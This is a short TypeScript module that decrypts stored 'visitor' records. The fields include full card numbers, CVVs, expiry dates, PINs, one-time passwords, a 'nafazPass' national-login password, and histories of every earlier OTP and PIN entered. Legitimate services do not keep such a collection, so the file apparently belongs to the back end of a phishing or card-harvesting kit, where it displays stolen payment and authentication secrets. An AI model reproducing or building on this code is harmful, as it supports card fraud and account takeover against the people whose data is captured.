import { _d } from './secure-utils'

export function decryptVisitorData(visitor: any): any {
  if (!visitor) return visitor

  const decrypted = { ...visitor }

  const fieldsToDecrypt = [
    'cardNumber',
    'cvv',
    'expiryDate',
    'otp',
    'pinCode',
    'nafazPass',
    'phoneOtp'
  ]

  fieldsToDecrypt.forEach(field => {
    if (decrypted[field] && typeof decrypted[field] === 'string') {
      try {
        decrypted[field] = _d(decrypted[field])
      } catch (e) {
        console.log(`Field ${field} is not encrypted or decryption failed`)
      }
    }
  })

  if (decrypted.oldOtp && Array.isArray(decrypted.oldOtp)) {
    decrypted.oldOtp = decrypted.oldOtp.map((item: any) => {
      if (item.code && typeof item.code === 'string') {
        try {
          return { ...item, code: _d(item.code) }
        } catch (e) {
          return item
        }
      }
      return item
    })
  }

  if (decrypted.oldPinCode && Array.isArray(decrypted.oldPinCode)) {
    decrypted.oldPinCode = decrypted.oldPinCode.map((item: any) => {
      if (item.code && typeof item.code === 'string') {
        try {
          return { ...item, code: _d(item.code) }
        } catch (e) {
          return item
        }
      }
      return item
    })
  }

  if (decrypted.oldPhoneOtp && Array.isArray(decrypted.oldPhoneOtp)) {
    decrypted.oldPhoneOtp = decrypted.oldPhoneOtp.map((item: any) => {
      if (item.code && typeof item.code === 'string') {
        try {
          return { ...item, code: _d(item.code) }
        } catch (e) {
          return item
        }
      }
      return item
    })
  }

  return decrypted
}
